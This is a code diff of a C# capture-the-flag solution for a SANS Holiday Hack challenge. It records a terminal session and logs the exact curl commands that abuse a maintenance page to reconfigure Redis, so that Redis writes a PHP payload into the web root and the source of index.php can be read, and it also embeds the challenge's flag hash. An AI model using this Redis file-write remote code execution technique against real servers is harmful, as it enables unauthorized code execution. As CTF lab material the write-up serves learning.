@@ -11,11 +11,79 @@ namespace Janda.CTF.SANS.HolidayHack
             _logger = logger;
         }
 
-        
+
+
+        /// <summary>
+        /// Remote Code Execution (RCE)
+        /// </summary>
         public void Run()
         {
 
-            /// Remote Code Execution (RCE)
+            @"
+
+                We need your help!!
+
+                The server stopped working, all that's left is the maintenance port.
+
+                To access it, run:
+
+                curl http://localhost/maintenance.php
+
+                We're pretty sure the bug is in the index page. Can you somehow use the
+                maintenance page to view the source code for the index page?
+                player@58394353a03f:~$ curl http://localhost/maintenance.php?cmd=config,set,dir,/var/www/html
+                Running: redis-cli --raw -a '<password censored>' 'config' 'set' 'dir' '/var/www/html'
+
+                OK
+                player@58394353a03f:~$ curl http://localhost/maintenance.php?cmd=config,set,dbfilename,some.php
+                Running: redis-cli --raw -a '<password censored>' 'config' 'set' 'dbfilename' 'some.php'
+
+                OK
+                player@58394353a03f:~$ curl http://localhost/maintenance.php?cmd=set,test,""%3C%3Fphp+readfile('index.php')+%3F%3E""
+                Running: redis-cli --raw -a '<password censored>' 'set' 'test' '<?php readfile('\''index.php'\'') ?>'
+
+                OK
+                player@58394353a03f:~$ curl http://localhost/maintenance.php?cmd=save
+                Running: redis-cli --raw -a '<password censored>' 'save'
+
+                OK
+                player@58394353a03f:~$ curl http://localhost/some.php
+                Warning: Binary output can mess up your terminal. Use ""--output -"" to tell 
+                Warning: curl to output it to your terminal anyway, or consider ""--output 
+                Warning: <FILE>"" to save to a file.
+                player@58394353a03f:~$ curl http://localhost/some.php --output -
+                REDIS0009�      redis-ver5.0.3�
+                �edis-bits�@�ctime�ª�_used-mem
+                 aof-preamble��� test<?php
+
+                # We found the bug!!
+                #
+                #         \   /
+                #         .\-/.
+                #     /\ ()   ()
+                #       \/~---~\.-~^-.
+                # .-~^-./   |   \---.
+                #      {    |    }   \
+                #    .-~\   |   /~-.
+                #   /    \  A  /    \
+                #         \/ \/
+                # 
+
+                echo ""Something is wrong with this page! Please use http://localhost/maintenance.php to see if you can figure out what's going on""
+                ?>
+                example1The site is in maintenance modexample2#We think there's a bug in index.php���'i hplayer@58394353a03f:~$ 
+
+            ".LogMessage(_logger, "Run following commands: \n{1}\n{2}\n{3}\n{4}\n{5}\n",
+                "curl http://localhost/maintenance.php?cmd=config,set,dir,/var/www/html",
+                "curl http://localhost/maintenance.php?cmd=config,set,dbfilename,some.php",
+                "curl http://localhost/maintenance.php?cmd=set,test,\"%3C%3Fphp+readfile('index.php')+%3F%3E\"",
+                "curl http://localhost/maintenance.php?cmd=save",
+                "curl http://localhost/some.php --output -");
+        }
+
+        void Investigation()
+        {
+
             @"
                 We need your help!!
 
@@ -56,9 +124,9 @@ namespace Janda.CTF.SANS.HolidayHack
 
                 OK
             ".LogMessage(_logger, @"curl http://localhost/maintenance.php?cmd=set,test,""%3C%3Fphp+show_source('index.php')+%3F%3E""");
-            
 
-             @"
+
+            @"
                 Running: redis-cli --raw -a '<password censored>' 'save'
 
                 OK
@@ -148,9 +216,8 @@ namespace Janda.CTF.SANS.HolidayHack
                 echo ""Something is wrong with this page! Please use http://localhost/maintenance.php to see if you can figure out what's going on""
                 ?>
 
-            ".LogMessage(_logger, "index.php {html}", @"<code><span style=\""color: #000000\""><span style=\""color: #0000BB\"">&lt;?php<br /><br /></span><span style=\""color: #FF8000\"">#&nbsp;We&nbsp;found&nbsp;the&nbsp;bug!!<br />#<br />#&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\&nbsp;&nbsp;&nbsp;/<br />#&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;.\-/.<br />#&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;/\&nbsp;()&nbsp;&nbsp;&nbsp;()<br />#&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\/~---~\.-~^-.<br />#&nbsp;.-~^-./&nbsp;&nbsp;&nbsp;|&nbsp;&nbsp;&nbsp;\---.<br />#&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{&nbsp;&nbsp;&nbsp;&nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;}&nbsp;&nbsp;&nbsp;\<br />#&nbsp;&nbsp;&nbsp;&nbsp;.-~\&nbsp;&nbsp;&nbsp;|&nbsp;&nbsp;&nbsp;/~-.<br />#&nbsp;&nbsp;&nbsp;/&nbsp;&nbsp;&nbsp;&nbsp;\&nbsp;&nbsp;A&nbsp;&nbsp;/&nbsp;&nbsp;&nbsp;&nbsp;\<br />#&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\/&nbsp;\/<br />#&nbsp;#####hhc:{\""hash\"":&nbsp;\""dfd550b4b1bc136d9480bc570f7ec2382f5bd23cf9e227770582c15118e5bc8b\"",&nbsp;\""resourceId\"":&nbsp;\""7246f9a7-3cf1-4471-b663-f4e8391b0208\""}#####<br /><br /></span><span style=\""color: #007700\"">echo&nbsp;</span><span style=\""color: #DD0000\"">\""Something&nbsp;is&nbsp;wrong&nbsp;with&nbsp;this&nbsp;page!&nbsp;Please&nbsp;use&nbsp;http://localhost/maintenance.php&nbsp;to&nbsp;see&nbsp;if&nbsp;you&nbsp;can&nbsp;figure&nbsp;out&nbsp;what's&nbsp;going&nbsp;on\""<br /></span><span style=\""color: #0000BB\"">?&gt;<br /></span></span></code>\" );
+            ".LogMessage(_logger, "index.php {html}", @"<code><span style=\""color: #000000\""><span style=\""color: #0000BB\"">&lt;?php<br /><br /></span><span style=\""color: #FF8000\"">#&nbsp;We&nbsp;found&nbsp;the&nbsp;bug!!<br />#<br />#&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\&nbsp;&nbsp;&nbsp;/<br />#&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;.\-/.<br />#&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;/\&nbsp;()&nbsp;&nbsp;&nbsp;()<br />#&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\/~---~\.-~^-.<br />#&nbsp;.-~^-./&nbsp;&nbsp;&nbsp;|&nbsp;&nbsp;&nbsp;\---.<br />#&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{&nbsp;&nbsp;&nbsp;&nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;}&nbsp;&nbsp;&nbsp;\<br />#&nbsp;&nbsp;&nbsp;&nbsp;.-~\&nbsp;&nbsp;&nbsp;|&nbsp;&nbsp;&nbsp;/~-.<br />#&nbsp;&nbsp;&nbsp;/&nbsp;&nbsp;&nbsp;&nbsp;\&nbsp;&nbsp;A&nbsp;&nbsp;/&nbsp;&nbsp;&nbsp;&nbsp;\<br />#&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\/&nbsp;\/<br />#&nbsp;#####hhc:{\""hash\"":&nbsp;\""dfd550b4b1bc136d9480bc570f7ec2382f5bd23cf9e227770582c15118e5bc8b\"",&nbsp;\""resourceId\"":&nbsp;\""7246f9a7-3cf1-4471-b663-f4e8391b0208\""}#####<br /><br /></span><span style=\""color: #007700\"">echo&nbsp;</span><span style=\""color: #DD0000\"">\""Something&nbsp;is&nbsp;wrong&nbsp;with&nbsp;this&nbsp;page!&nbsp;Please&nbsp;use&nbsp;http://localhost/maintenance.php&nbsp;to&nbsp;see&nbsp;if&nbsp;you&nbsp;can&nbsp;figure&nbsp;out&nbsp;what's&nbsp;going&nbsp;on\""<br /></span><span style=\""color: #0000BB\"">?&gt;<br /></span></span></code>\");
         }
-
 
 
         void BadRequest()
